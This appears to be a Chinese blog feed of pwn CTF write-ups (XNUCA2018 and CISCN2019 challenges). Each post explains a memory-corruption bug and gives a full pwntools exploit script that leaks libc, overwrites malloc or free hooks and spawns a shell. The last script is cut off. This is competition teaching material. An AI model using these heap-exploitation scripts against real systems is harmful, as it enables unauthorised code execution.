class="number">0x1f</span>)</span><br><span class="line">add(<span class="number">2</span> , <span class="string">'2'</span> * <span class="number">0x1f</span>)</span><br><span class="line">add(<span class="number">3</span> , <span class="string">'3'</span> * <span class="number">0x18</span> + <span class="string">'1'</span>)</span><br><span class="line">add(<span class="number">4</span> , <span class="string">'4'</span> * <span class="number">0x19</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">heap_base = u64(show(<span class="number">2</span>).ljust(<span class="number">8</span> , <span class="string">'\x00'</span>)) - <span class="number">0x30</span></span><br><span class="line">success(<span class="string">'heap_base =&gt; '</span> + hex(heap_base))</span><br><span class="line"></span><br><span class="line"><span class="comment">#unlink</span></span><br><span class="line">fake_fastbin = heap_base + <span class="number">0xb0</span></span><br><span class="line">edit(<span class="number">2</span> , p64(fake_fastbin))</span><br><span class="line">add(<span class="number">5</span> , <span class="string">'5'</span> * <span class="number">0x8</span>)</span><br><span class="line">add(<span class="number">6</span> , fake_head)</span><br><span class="line">add(<span class="number">7</span> , <span class="string">'7'</span> * <span class="number">0x1f</span>)</span><br><span class="line">add(<span class="number">8</span> , <span class="string">'8'</span> * <span class="number">0x1f</span>)</span><br><span class="line">add(<span class="number">0</span> , <span class="string">'0'</span> * <span class="number">0x1f</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#leak libc_base</span></span><br><span class="line">payload = p64(free_got) + p64(<span class="number">0</span>) * <span class="number">2</span> + p64(<span class="number">0x6020a0</span>)</span><br><span class="line">edit(<span class="number">9</span> , payload[:<span class="number">-1</span>])</span><br><span class="line">libc.address = u64(show(<span class="number">6</span>).ljust(<span class="number">8</span> , <span class="string">'\x00'</span>)) - libc.symbols[<span class="string">'free'</span>]</span><br><span class="line">success(<span class="string">'libc_base =&gt; '</span> + hex(libc.address))</span><br><span class="line">free_hook = libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">success(<span class="string">'free_hook =&gt; '</span> + hex(free_hook))</span><br><span class="line">system_addr = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">success(<span class="string">'system_addr =&gt; '</span> + hex(system_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#break limit and change free_hook to system</span></span><br><span class="line">payload2 = p64(<span class="number">0</span>) + p64(free_hook) + p64(<span class="number">4</span>)</span><br><span class="line">edit(<span class="number">9</span> , payload2[:<span class="number">-1</span>])</span><br><span class="line">edit(<span class="number">9</span> , p64(system_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#get shell</span></span><br><span class="line">add(<span class="number">8</span> , <span class="string">'/bin/sh'</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.sendline(<span class="string">'8'</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">#make a fastbin attack to .bss</span></span><br><span class="line"><span class="string">free(8)</span></span><br><span class="line"><span class="string">bss_fastbin = 0x602090</span></span><br><span class="line"><span class="string">edit(8 , p64(bss_fastbin))</span></span><br><span class="line"><span class="string">bss_head = p64(0) + p64(0x31) + p64(0)</span></span><br><span class="line"><span class="string">edit(9 , bss_head[:-1])</span></span><br><span class="line"><span class="string">add(6 , '/bin/sh')</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#leak libc_base and change limit</span></span><br><span class="line"><span class="string">payload = p64(free_got) + p64(bss_fastbin) + p64(4)</span></span><br><span class="line"><span class="string">add(8 , payload)</span></span><br><span class="line"><span class="string">libc.address = u64(show(8).ljust(8 , '\x00')) - libc.symbols['free']</span></span><br><span class="line"><span class="string">success('libc_base =&gt; ' + hex(libc.address))</span></span><br><span class="line"><span class="string">free_hook = libc.symbols['__free_hook']</span></span><br><span class="line"><span class="string">success('free_hook =&gt; ' + hex(free_hook))</span></span><br><span class="line"><span class="string">system_addr = libc.symbols['system']</span></span><br><span class="line"><span class="string">success('system_addr =&gt; ' + hex(system_addr))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#change free_hook to system</span></span><br><span class="line"><span class="string">payload = p64(heap_base + 0x130) + p64(0) + p64(0) + p64(free_hook)</span></span><br><span class="line"><span class="string">edit(9 , payload[:-1])</span></span><br><span class="line"><span class="string">edit(9 , p64(system_addr)[:-1])</span></span><br><span class="line"><span class="string">p.sendline('4')</span></span><br><span class="line"><span class="string">p.sendline('6')</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li></ul><h2 id="0x03-blind"><a href="#0x03-blind" class="headerlink" title="0x03 blind"></a>0x03 blind</h2><ul><li>程序功能<br>和上一道<strong>babyheap</strong>很像，不一样的是这次对<strong>edit</strong>没有限制，但是限制了只能<strong>free3</strong>次，并且还提供了后门函数</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XNUCA2018初赛pwn writeup</title>
      <link href="/2020/03/12/XNUCA2018%E5%88%9D%E8%B5%9Bpwn%20writeup/"/>
      <url>/2020/03/12/XNUCA2018%E5%88%9D%E8%B5%9Bpwn%20writeup/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-写在前面"><a href="#0x00-写在前面" class="headerlink" title="0x00 写在前面"></a>0x00 写在前面</h2><p>今年被拦在了初赛的门槛，无缘深圳的决赛，<del>看不到去年在网鱼看到了小姐姐了QAQ</del>。初赛没有<strong>misc</strong>和简单的<strong>crypto</strong>，不是很亲民，只好当场去啃<strong>pwn</strong>题目。然后…发现要不就是晦涩难懂的<strong>C艹</strong>，能看懂的堆题要不就开了<strong>seccomp</strong>，要不就远程是个<strong>busy box</strong>，看的最明白的就一行<strong>gets</strong>函数加栈溢出<strong>get shell</strong>的又无从下手，果然很不亲民啊……</p><a id="more"></a><h2 id="0x01-0gadget"><a href="#0x01-0gadget" class="headerlink" title="0x01 0gadget"></a>0x01 0gadget</h2><ul><li>程序功能</li></ul><p>程序没有去符号表，是一个日志系统，具有增、删、查的功能，最多可以有<strong>15</strong>个<strong>note</strong>。每个<strong>note</strong>对应着在<strong>.bss</strong>的一个结构体如下:<br><img src="https://upload-images.jianshu.io/upload_images/8447551-09a0d997680b2ea5.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="数据结构"><br>查日志时会在检查<strong>inuse</strong>位后将<strong>title</strong>和<strong>content_ptr</strong>指向的<strong>size</strong>长度打印出来。<br>删除日志时会将<strong>content_ptr free</strong>掉，并将<strong>inuse</strong>位赋<strong>0</strong>。</p><ul><li>漏洞位置<br>在<strong>add note</strong>赋值完<strong>content</strong>后，赋值<strong>title</strong>时会有<strong>one_byte_off</strong>，可覆盖掉<strong>content_ptr</strong>，之后可以实现任意地址<strong>free</strong>。<br><img src="https://upload-images.jianshu.io/upload_images/8447551-64cc7a806ed3f681.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="one_byte_off"></li></ul><p><strong>delete note</strong>时不会将<strong>heap</strong>内的<strong>content</strong>内容清空，可结合<strong>show note</strong>实现重要地址的<strong>leak</strong>。</p><ul><li>利用思路</li></ul><p>先利用<strong>show</strong>和<strong>delete unsort bin leak</strong>出<strong>libc</strong>和<strong>heap</strong>的基址，然后申请一个<strong>unsort bin</strong>并在其中构造<strong>size</strong>为<strong>0x71</strong>的<strong>fastbin</strong>，再利用<strong>one_byte_off</strong>溢出<strong>content_ptr</strong>，<strong>free</strong>掉<strong>fastbin</strong>。之后将<strong>unsort bin</strong>释放掉，再申请刚刚释放的<strong>unsort bin</strong>并构造其中<strong>fastbin</strong>的<strong>fake_fd</strong>至<strong>malloc_hook</strong>前，对齐<strong>size</strong>到<strong>0x7f</strong>，最后申请两次<strong>0x60</strong>触发<strong>fastbin attack</strong>，最后修改<strong>malloc_hook</strong>指针为<strong>one_gadget</strong>，再次申请时可触发<strong>one_gadget</strong>起<strong>shell</strong>。</p><ul><li><strong>my-exp</strong><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(<span class="string">'./0gadget'</span>)</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc-2.23.so'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'106.75.63.193'</span> , <span class="number">9705</span>)<span class="comment">#nc 106.75.63.193 9705</span></span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc-2.23.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size , title , content , remark)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'size: '</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">'title: '</span>)</span><br><span class="line">    p.sendline(title)</span><br><span class="line">    p.recvuntil(<span class="string">'content: '</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line">    p.recvuntil(<span class="string">'REMARK: '</span>)</span><br><span class="line">    p.sendline(remark)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index , remark)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'delete: '</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.recvuntil(<span class="string">'REMARK: '</span>)</span><br><span class="line">    p.sendline(remark)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index , remark)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'show: '</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    tmp = p.recvuntil(<span class="string">'\nREMARK: '</span>).split(<span class="string">'\n'</span>)</span><br><span class="line">    title = tmp[<span class="number">0</span>].split(<span class="string">': '</span>)[<span class="number">1</span>]</span><br><span class="line">    content = tmp[<span class="number">1</span>].split(<span class="string">': '</span>)[<span class="number">1</span>]</span><br><span class="line">    p.sendline(remark)</span><br><span class="line">    <span class="keyword">return</span> title , content</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">print</span> pidof(p)[<span class="number">0</span>]</span><br><span class="line">    raw_input()</span><br><span class="line"></span><br><span class="line">one_gadget = [<span class="number">0x45216</span> , <span class="number">0x4526a</span> , <span class="number">0xf02a4</span> , <span class="number">0xf1147</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#leak libc_base</span></span><br><span class="line">add(<span class="number">0x80</span> , <span class="string">'a'</span> * <span class="number">0x10</span> , <span class="string">'A'</span> * <span class="number">0x40</span> , <span class="string">'aA'</span> * <span class="number">0x10</span>)   <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x80</span> , <span class="string">'b'</span> * <span class="number">0x10</span> , <span class="string">'B'</span> * <span class="number">0x80</span> , <span class="string">'bB'</span> * <span class="number">0x10</span>)   <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x80</span> , <span class="string">'c'</span> * <span class="number">0x10</span> , <span class="string">'C'</span> * <span class="number">0x40</span> , <span class="string">'cC'</span> * <span class="number">0x10</span>)   <span class="comment">#2</span></span><br><span class="line">free(<span class="number">1</span> , <span class="string">''</span>)</span><br><span class="line">add(<span class="number">0x80</span> , <span class="string">'d'</span> * <span class="number">0x10</span> , <span class="string">'\x78'</span> , <span class="string">'dD'</span> * <span class="number">0x10</span>)       <span class="comment">#1</span></span><br><span class="line">libc.address = u64(show(<span class="number">1</span> , <span class="string">''</span>)[<span class="number">1</span>][:<span class="number">6</span>].ljust(<span class="number">8</span> , <span class="string">'\x00'</span>)) - <span class="number">0x3c4b78</span></span><br><span class="line">success(<span class="string">'libc_base =&gt; '</span> + hex(libc.address))</span><br><span class="line">add(<span class="number">0x10</span> , <span class="string">'e'</span> * <span class="number">0x10</span> , <span class="string">'E'</span> * <span class="number">0x20</span> , <span class="string">'eE'</span> * <span class="number">0x10</span>)   <span class="comment">#3</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#leak heap_base</span></span><br><span class="line">free(<span class="number">0</span> , <span class="string">''</span>)</span><br><span class="line">free(<span class="number">2</span> , <span class="string">''</span>)</span><br><span class="line">add(<span class="number">0x80</span> , <span class="string">'f'</span> * <span class="number">0x10</span> , <span class="string">'\x78'</span> , <span class="string">'fF'</span> * <span class="number">0x10</span>)       <span class="comment">#0</span></span><br><span class="line">heap_base = u64(show(<span class="number">0</span> , <span class="string">''</span>)[<span class="number">1</span>][<span class="number">8</span>:<span class="number">11</span>].ljust(<span class="number">8</span> , <span class="string">'\x00'</span>)) - <span class="number">0x120</span></span><br><span class="line">success(<span class="string">'heap_base =&gt; '</span> + hex(heap_base))</span><br><span class="line"></span><br><span class="line"><span class="comment">#make fastbin_attack</span></span><br><span class="line">ptr = <span class="number">0x6022b8</span></span><br><span class="line">payload = <span class="number">0x98</span> * <span class="string">'\x00'</span> + p64(<span class="number">0x71</span>)</span><br><span class="line">add(<span class="number">0x100</span> , <span class="string">'g'</span> * <span class="number">0x10</span> , payload , <span class="string">'remark'</span>)        <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x90</span> , <span class="string">'h'</span> * <span class="number">0x90</span> + <span class="string">'\x80'</span> , <span class="string">''</span> ,<span class="string">'remark'</span>)      <span class="comment">#4</span></span><br><span class="line">free(<span class="number">4</span> , <span class="string">''</span>)</span><br><span class="line">free(<span class="number">2</span> , <span class="string">''</span>)</span><br><span class="line">malloc_hook = libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">success(<span class="string">'malloc_hook =&gt; '</span> + hex(malloc_hook))</span><br><span class="line">silver_bullet = libc.address + one_gadget[<span class="number">3</span>]</span><br><span class="line">success(<span class="string">'silver_bullet =&gt; '</span> + hex(silver_bullet))</span><br><span class="line">fake_fd = malloc_hook - <span class="number">0x13</span></span><br><span class="line">payload = <span class="number">0x98</span> * <span class="string">'\x00'</span> + p64(<span class="number">0x71</span>) + p64(fake_fd)</span><br><span class="line">add(<span class="number">0x100</span> , <span class="string">'i'</span> * <span class="number">0x10</span> , payload , <span class="string">'remark'</span>)        <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x60</span> , <span class="string">'j'</span> * <span class="number">0x10</span> , <span class="string">'test'</span> , <span class="string">'remark'</span>)          <span class="comment">#5</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#trigger fastbin</span></span><br><span class="line">add(<span class="number">0x60</span> , <span class="string">'k'</span> * <span class="number">0x10</span> , <span class="string">'123'</span> + p64(silver_bullet) , <span class="string">'remark'</span>)      <span class="comment">#6</span></span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.sendline(<span class="string">'123'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li></ul><h2 id="0x02-gets"><a href="#0x02-gets" class="headerlink" title="0x02 gets"></a>0x02 gets</h2><ul><li>程序功能&amp;程序漏洞<br>程序很简单，就两行代码，明显的栈溢出<br><img src="https://upload-images.jianshu.io/upload_images/8447551-a022c0a8c54b5b60.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="gets"></li></ul><h2 id="0x03-steak"><a href="#0x03-steak" class="headerlink" title="0x03 steak"></a>0x03 steak</h2>]]></content>
      
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CISCN2019 国赛线上初赛pwn</title>
      <link href="/2020/03/12/CISCN2019%20%E5%9B%BD%E8%B5%9B%E7%BA%BF%E4%B8%8A%E5%88%9D%E8%B5%9Bpwn/"/>
      <url>/2020/03/12/CISCN2019%20%E5%9B%BD%E8%B5%9B%E7%BA%BF%E4%B8%8A%E5%88%9D%E8%B5%9Bpwn/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-写在前面"><a href="#0x00-写在前面" class="headerlink" title="0x00 写在前面"></a>0x00 写在前面</h2><p>最后一次参加国赛了额，无论队伍能否走到决赛，我都无缘参赛了，希望队伍能走的更远吧。这次国赛比起前两年的题目要简单的很多，大部分题目都很基础，漏洞点很明显，利用思路也异常清晰。利用毕设的闲暇时间整理下<strong>writeup</strong></p><a id="more"></a><h2 id="0x01-your-pwn"><a href="#0x01-your-pwn" class="headerlink" title="0x01 your_pwn"></a>0x01 your_pwn</h2><ul><li>程序功能</li></ul><p>一直输入<strong>name</strong>，以及数组中<strong>name</strong>对应的<strong>index</strong>。</p><ul><li>漏洞位置</li></ul><p>在功能函数中，再输入<strong>index</strong>时没有检测其合法性，导致在之后会有数组越界访问的漏洞。<br><img src="https://upload-images.jianshu.io/upload_images/8447551-0e04acab67fd65e9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="功能函数"></p><ul><li>利用思路</li></ul><p>虽然本题保护机制全开。<br><img src="https://upload-images.jianshu.io/upload_images/8447551-08aa0f9dc18c597d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="checksec"><br>但通过合理利用数组越界可达到栈上任意地址读写的目的。可以定点修改返回地址劫持程序控制流。<br>第一步，通过任意地址读，找到存在栈上的<strong>__libc_start_main + 240</strong>偏移后<strong>leak</strong>出<strong>libc</strong>基址。<br>第二步，找到栈上存的返回地址的偏移，并将其写为<strong>one_gadget</strong>。<br>第三步，让程序正常返回，劫持程序流到<strong>one_gadget</strong>来<strong>get shell</strong>。</p><ul><li><strong>my-exp</strong></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">'./pwn'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">'1b190bf34e999d7f752a35fa9ee0d911.kr-lab.com'</span> , <span class="number">57856</span>)<span class="comment">#nc 1b190bf34e999d7f752a35fa9ee0d911.kr-lab.com 57856</span></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc-2.23.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">print</span> pidof(p)</span><br><span class="line">raw_input()</span><br><span class="line"></span><br><span class="line"><span class="comment">#step1 leak libc_base</span></span><br><span class="line">p.recvuntil(<span class="string">'name:'</span>)</span><br><span class="line">p.sendline(<span class="string">'test'</span>)</span><br><span class="line">libc_leak = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">637</span> , <span class="number">631</span> , <span class="number">-1</span>):</span><br><span class="line">p.recvuntil(<span class="string">'index\n'</span>)</span><br><span class="line">p.sendline(str(i))</span><br><span class="line">p.recvuntil(<span class="string">'(hex) '</span>)</span><br><span class="line">aa = p.recvuntil(<span class="string">'\n'</span>)[:<span class="number">-1</span>]</span><br><span class="line"><span class="keyword">if</span>(len(aa) &lt; <span class="number">2</span>):</span><br><span class="line">libc_leak += <span class="string">'0'</span> + aa</span><br><span class="line"><span class="keyword">elif</span>(len(aa) == <span class="number">8</span>):</span><br><span class="line">libc_leak += aa[<span class="number">-2</span>:]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">libc_leak += aa</span><br><span class="line">p.recvuntil(<span class="string">'value\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line"><span class="keyword">print</span> libc_leak</span><br><span class="line">libc.address = int(<span class="string">'0x'</span> + libc_leak , <span class="number">16</span>) - libc.symbols[<span class="string">'__libc_start_main'</span>] - <span class="number">240</span></span><br><span class="line">success(<span class="string">'libc_base =&gt; '</span> + hex(libc.address))</span><br><span class="line">one_gadget = <span class="number">0xf02a4</span> + libc.address</span><br><span class="line"></span><br><span class="line"><span class="comment">#step2 overwrite EIP to one_gadget</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">p.recvuntil(<span class="string">'index\n'</span>)</span><br><span class="line">p.sendline(str(i + <span class="number">344</span>))</span><br><span class="line">p.recvuntil(<span class="string">'value\n'</span>)</span><br><span class="line">p.sendline(str(ord(p64(one_gadget)[i])))</span><br><span class="line"></span><br><span class="line"><span class="comment">#Get Shell &amp; Have Fun</span></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">p.sendline(<span class="string">'a'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'(yes/no)? \n'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x02-daily"><a href="#0x02-daily" class="headerlink" title="0x02 daily"></a>0x02 daily</h2><ul><li>程序功能</li></ul><p>一个记录日报的日记本题目，可指定日报的长度和内容，具有正常的增删查改功能。</p><ul><li>漏洞位置</li></ul><p>在<strong>remove</strong>功能中，由于没有对输入的<strong>index</strong>进行检查，会导致数组越界，造成任意地址<strong>free</strong>。<br><img src="https://upload-images.jianshu.io/upload_images/8447551-4c7332a4d2c51fda.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="remove"></p><ul><li>利用思路</li></ul><p>程序开了除<strong>PIE</strong>外所有的保护机制。<br><img src="https://upload-images.jianshu.io/upload_images/8447551-72206999e2bed84e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="checksec"><br>通过任意地址<strong>free</strong>，直接<strong>free</strong>堆头地址，再利用<strong>bss</strong>留存的堆块指针进行<strong>UAF</strong>操作。<br>第一步，正常利用<strong>unsort bin</strong>进行堆基址和<strong>libc</strong>基址的<strong>leak</strong>。<br>第二步，利用任意地址<strong>free</strong>，直接将布置好的堆块<strong>free</strong>到<strong>fastbin</strong>中。<br>第三步，利用<strong>bss</strong>段留存的该堆块指针，进行<strong>fastbin attack</strong>，将<strong>bss</strong>段当作堆块申请。<br>第四步，通过申请到的<strong>bss</strong>段堆块，将其余堆块指针覆盖为<strong>free_hook</strong>地址，并通过<strong>edit</strong>被覆盖的堆块索引，将<strong>free_hook</strong>写为<strong>system</strong>地址。<br>第五步，通过<strong>free</strong>之前布置好的<strong>data</strong>为<strong>‘/bin/sh\x00’</strong>的对应<strong>Header</strong>来<strong>get shell</strong>。</p><ul><li><strong>my-exp</strong></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">'./pwn'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">'85c3e0fcae5e972af313488de60e8a5a.kr-lab.com'</span> , <span class="number">58512</span>)<span class="comment">#nc 85c3e0fcae5e972af313488de60e8a5a.kr-lab.com 58512</span></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc-2.23.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'choice:'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">raw = p.recvuntil(<span class="string">'==='</span>)[:<span class="number">-4</span>]</span><br><span class="line"><span class="keyword">return</span> raw</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(length , content)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'choice:'</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'daily:'</span>)</span><br><span class="line">p.sendline(str(length))</span><br><span class="line">p.recvuntil(<span class="string">'daily\n'</span>)</span><br><span class="line">p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(index , content)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'choice:'</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span 